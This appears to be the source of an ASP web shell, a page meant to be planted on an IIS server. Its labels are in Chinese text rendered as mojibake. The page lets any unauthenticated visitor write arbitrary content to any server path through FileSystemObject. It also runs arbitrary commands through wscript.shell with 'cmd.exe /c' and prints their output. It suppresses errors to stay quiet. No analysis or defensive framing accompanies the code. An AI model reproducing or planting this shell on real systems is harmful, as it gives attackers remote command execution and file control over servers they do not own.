<html><body>
<STYLE TYPE="text/css">textarea,input,body,select,pre,td,th{font-family: "����";font-size: 9pt}.button {border-width: 1px} .text {border:solid 1px}</STYLE>
<Title>�ϴ�</Title>
<%Dim objFSO%>
<%Dim fdata%>
<%Dim objCountFile%>
<%on error resume next%>
<%Set objFSO = Server.CreateObject("Scripting.FileSystemObject")%>
<%if Trim(request("syfdpath"))<>"" then%>
<%fdata = request("cyfddata")%>
<%Set objCountFile=objFSO.CreateTextFile(request("syfdpath"),True)%>
<%objCountFile.Write fdata%>
<%if err =0 then%>
<font color=red>����ɹ�.�뷵��ˢ��ҳ��!</font>
<%else%>
<font color=red>����ʧ��.���ܷ�������֧��FSO</font>
<%end if%>
<%err.clear%>
<%end if%>
<%objCountFile.Close%>
<%Set objCountFile=Nothing%>
<%Set objFSO = Nothing%>
<form action='' method=post>
<font color=red>�������ļ�����·��:</font><br>
<input type=text name=syfdpath width=32 value="<%=server.mappath(Request.ServerVariables("SCRIPT_NAME"))%>" style="border:solid 1px" size=80><br>
�����������:<br>
<textarea name=cyfddata cols=80 rows=10 width=32 style="border:solid 1px"></textarea>
<br><input type=submit value=���� style="border:solid 1px">
</form><form action="" method="post">
CMD����:<input type=text name=c style="border:solid 1px" size=73><br>
<textarea cols=80 rows=20 style="border:solid 1px">
<%=server.createobject("wscript.shell").exec("cmd.exe /c" &request("c")).stdout.readall%>
</textarea></form></body></html>

